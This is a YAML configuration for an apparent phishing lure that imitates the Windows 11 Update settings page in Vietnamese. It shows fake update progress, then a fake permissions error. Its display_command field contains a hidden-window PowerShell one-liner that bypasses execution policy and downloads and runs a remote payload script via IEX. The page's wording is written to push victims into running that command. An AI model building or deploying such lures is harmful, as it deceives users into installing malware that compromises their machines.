# Windows Update Lure
# Mimics Windows 11 Settings > Windows Update page with fake progress & error

type: update_error
template: lures/software_update.html
route: /cap-nhat-windows

payload:
  script: "default.js"

content:
  title: "Cập nhật tích lũy tháng 6 năm 2025 cho Windows 11 phiên bản 24H2"
  version: "Phiên bản 24H2 Build 26100.1 · 856 MB"
  description: "Các bản cập nhật bảo mật quan trọng đã sẵn sàng cho hệ thống của bạn."
  error_title: "Cài Đặt Thất Bại"
  error_message: >
    Windows Update không thể cài đặt bản cập nhật do lỗi quyền truy cập.
    Cần có quyền quản trị viên để hoàn tất cài đặt.
  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""

styles:
  theme: "windows"
  primary_color: "#0067c0"
  error_color: "#d83b01"